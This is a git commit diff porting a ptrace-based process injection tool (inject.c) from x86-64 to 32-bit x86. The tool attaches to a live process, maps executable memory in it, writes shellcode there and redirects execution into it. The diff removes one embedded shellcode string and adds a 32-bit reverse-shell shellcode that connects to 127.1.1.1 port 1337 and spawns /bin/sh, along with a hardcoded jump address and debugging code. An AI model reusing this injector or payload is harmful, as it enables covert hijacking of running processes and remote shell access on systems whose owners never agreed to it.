38644ee13d9f5e1b64931f220f3cbad55914d71e
laxa <laxa@ddracepro.net>
2022-11-17 11:13:19 +0100

    x86 version

--- inject.c
+++ inject.c
@@ -17,9 +17,9 @@
 #include <sys/syscall.h>
 #include "utils.h"
 
-#define SHELL_LEN 113 
-char *shellcode = "\x6a\x0a\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x29\x58\x0f\x05\x50\x5b\x52\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x01\x51\xb9\x00\x00\x00\x00\x51\xba\xff\xff\x05\xc0\x66\x21\xfa\x52\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\x59\x59\x53\x5f\x54\x5e\x6a\x1c\x5a\x6a\x2a\x58\x0f\x05\x48\x85\xc0\x75\xe0\x48\x96\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x31\xd2\x54\x5f\x6a\x3b\x58\x0f\x05";
-
+#define SHELL_LEN 80
+// char *shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+char *shellcode = "\x90\x90\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
 
 #define FLAGS_PROCESS 	(1<<0)
 #define FLAGS_DIRECT 	(1<<1)
@@ -30,7 +30,6 @@ void usage(const char *name)
 	fprintf(stderr, "\tUsage: %s PID [-p -d]\n", name);
 	exit(0);
 }
-
 
 int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
 {
@@ -49,7 +48,6 @@ int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
 	free(ptr);
 	return 0;
 }
-
 
 
 int peek_text(pid_t pid, size_t addr, char *buf, size_t blen)
@@ -75,7 +73,7 @@ size_t find_syscall_addr(pid_t pid, size_t addr)
 	int buf_size = 1024;
 	void *tmp_ptr;
 
-	char *syscall_op = "\x0f\x05"; 
+	char *syscall_op = "\xcd\x80"; 
 	char *buf = malloc(buf_size);
 	addr -= buf_size;
 	peek_text(pid, addr, buf, buf_size);
@@ -127,8 +125,8 @@ void remote_jmp(pid_t pid, void *addr)
 		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
 		exit(1);
 	}
-	
-	regs.rip = (uint64_t) addr;
+
+	regs.eip = (uint32_t) addr;
 
 	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
 	{
@@ -137,7 +135,7 @@ void remote_jmp(pid_t pid, void *addr)
 	}
 }
 
-uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t r10, uint64_t r8, uint64_t r9)
+uint32_t remote_syscall(pid_t pid, uint32_t eax, uint32_t ebx, uint32_t ecx, uint32_t edx, uint32_t esi, uint32_t edi, uint32_t ebp)
 {
 	
 	struct user_regs_struct regs, return_regs;
@@ -145,7 +143,7 @@ uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uin
 	bool substitute = false;	
 	
 	char saved_text[2];
-   	char *syscall_opt = "\x0f\x05";
+   	char *syscall_opt = "\xcd\x80";
 	int syscall_len = 2;
 
 
@@ -158,25 +156,27 @@ uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uin
 
 	// prepare regs for call
 	memcpy(&return_regs, &regs, sizeof(struct user_regs_struct));
-	return_regs.rax = rax;
-	return_regs.rdi = rdi;
-	return_regs.rsi = rsi;
-	return_regs.rdx = rdx;
-	return_regs.r10 = r10;
-	return_regs.r8 = r8;
-	return_regs.r9 = r9;
-	
-	void *ret =  (void *) find_syscall_addr(pid, return_regs.rip);
+	return_regs.eax = eax;
+	return_regs.ebx = ebx;
+	return_regs.ecx = ecx;
+	return_regs.edx = edx;
+	return_regs.esi = esi;
+	return_regs.edi = edi;
+	return_regs.ebp = ebp;
+
+	// 0x2a855
+	// void *ret =  (void *)0x2a855 + 0xff1000;
+	void *ret =  (void *)0x0804888d;
 	if (ret == NULL)
 	{
 		logs(LOG_WARNING, "cant find any syscall, using substitution method");
 		
-		peek_text(pid, regs.rip, saved_text, syscall_len);
+		peek_text(pid, regs.eip, saved_text, syscall_len);
 		substitute = true; 
 	}
 	else
 	{
-		return_regs.rip = (uint64_t) ret;
+		return_regs.eip = (uint32_t) ret;
 	}
 
 
@@ -186,7 +186,7 @@ uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uin
 		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
 		exit(1);
 	}
-	if (substitute){ poke_text(pid, regs.rip, syscall_opt, syscall_len); }
+	if (substitute){ poke_text(pid, regs.eip, syscall_opt, syscall_len); }
 
 	// exec
 	if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
@@ -211,31 +211,64 @@ uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uin
 		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
 		exit(1);
 	}
-	if (substitute){ poke_text(pid, regs.rip, saved_text, syscall_len); }
+	if (substitute){ poke_text(pid, regs.eip, saved_text, syscall_len); }
 
-	return return_regs.rax;
+	logs(LOG_DEGBUG, "[0x%02x] syscall ret: 0x%x", eax, return_regs.eax);
+
+	return return_regs.eax;
+}
+
+void debug_exec(pid_t pid)
+{
+	struct user_regs_struct regs;
+
+	for (int i = 0; i < 50; i++)
+	{
+			// get return val
+		if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
+		{
+			logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
+			exit(1);
+		}
+		printf("eax: %x, ebx: %x, ecx: %x, edx: %x, ebp: %x, esp: %x, edi: %x, esi: %x, eip: %x\n", 
+			regs.eax,
+			regs.ebx,
+			regs.ecx,
+			regs.edx,
+			regs.ebp,
+			regs.esp,
+			regs.edi,
+			regs.esi,
+			regs.eip);
+		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
+		{
+			logs(LOG_ERROR, "%s: %s", "ptrace SINGLESTEP", strerror(errno));
+			exit(1);
+		}
+		waitpid(pid, NULL, 0);
+	}
 }
 
 // some remote syscalls prototypes
 
 void *remote_mmap(pid_t pid, void *addr, size_t len, int prot, int flags, int fd, off_t offset)
 {
-	return (void *) remote_syscall(pid, SYS_mmap, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t)flags, (uint64_t) fd, (uint64_t) offset);
+	return (void *) remote_syscall(pid, 192, (uint32_t)addr, (uint32_t)len, (uint32_t)prot, (uint32_t)flags, (uint32_t) fd, (uint32_t) offset);
 }
 
 void *remote_mprotect(pid_t pid, void *addr, size_t len, int prot)
 {
-	return (void *) remote_syscall(pid, SYS_mprotect, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t) NULL, (uint64_t) NULL, (uint64_t) NULL);
+	return (void *) remote_syscall(pid, SYS_mprotect, (uint32_t)addr, (uint32_t)len, (uint32_t)prot, (uint32_t) NULL, (uint32_t) NULL, (uint32_t) NULL);
 }
 
 int  remote_write(pid_t pid, int fd, const void *buf, size_t count)
 {
-	return (int) remote_syscall(pid, SYS_write, (uint64_t) fd, (uint64_t) buf, (uint64_t) count, (uint64_t) NULL,(uint64_t) NULL, (uint64_t) NULL);
+	return (int) remote_syscall(pid, SYS_write, (uint32_t) fd, (uint32_t) buf, (uint32_t) count, (uint32_t) NULL,(uint32_t) NULL, (uint32_t) NULL);
 }
 
-uint64_t remote_clone(pid_t pid, int flags, void *child_stack)
+uint32_t remote_clone(pid_t pid, int flags, void *child_stack)
 {
-	return remote_syscall(pid, SYS_clone, (uint64_t)flags, (uint64_t)child_stack, (uint64_t) NULL, (uint64_t) NULL,(uint64_t) NULL,(uint64_t) NULL);
+	return remote_syscall(pid, SYS_clone, (uint32_t)flags, (uint32_t)child_stack, (uint32_t) NULL, (uint32_t) NULL,(uint32_t) NULL,(uint32_t) NULL);
 }
 
 
@@ -299,22 +332,26 @@ int main(int argc, char *argv[])
 	waitpid(pid, &wstatus, 0);
 
 	logs(LOG_DEGBUG, "allocating memory");
-	void *mem_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);	
-	void *stack_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);	
+	void *mem_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
+	logs(LOG_DEGBUG, "mem_addr: %p", mem_addr);
+	void *stack_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
+	logs(LOG_DEGBUG, "stack_addr: %p", stack_addr);
 	void *stack_top = stack_addr + 4096;
 	pid_t ret_pid;
 
 	logs(LOG_DEGBUG, "copying shellcode ( %d bytes )", SHELL_LEN);
 	poke_text(pid, (size_t) mem_addr, shellcode, SHELL_LEN);	
 	
-	logs(LOG_DEGBUG, "setting memory permissions");
-	remote_mprotect(pid, mem_addr, 4096, PROT_EXEC);
+	// logs(LOG_DEGBUG, "setting memory permissions");
+	// remote_mprotect(pid, mem_addr, 4096, PROT_READ | PROT_EXEC);
 	
 	if(flags & FLAGS_DIRECT)
 	{
 		// direct shellcode execution
 		logs(LOG_DEGBUG, "redirecting execution flow to shellcode");
-		remote_jmp(pid, mem_addr);
+		remote_jmp(pid, mem_addr + 2);
+		getchar();
+		debug_exec(pid);
 		
 		logs(LOG_DEGBUG, "detaching");
 		if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
@@ -335,17 +372,24 @@ int main(int argc, char *argv[])
 		// spawn new process
 		logs(LOG_DEGBUG, "starting new process");
 		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_VM, stack_top);
+		logs(LOG_DEGBUG, "ret_pid: %d", ret_pid);
 	}
 	else
 	{
 		// spawn new thread
 		logs(LOG_DEGBUG, "starting new thread");
-		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top);
+		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_THREAD | CLONE_FS | CLONE_FILES, stack_top);
+		logs(LOG_DEGBUG, "ret_pid: %d", ret_pid);
 	}
+
+	// getchar();
+	sleep(3);
 
 	logs(LOG_DEGBUG, "running shellcode");
 	remote_jmp(ret_pid, mem_addr);
-	
+
+	// debug_exec(ret_pid);
+
 	logs(LOG_DEGBUG, "detaching");
 	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
 		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
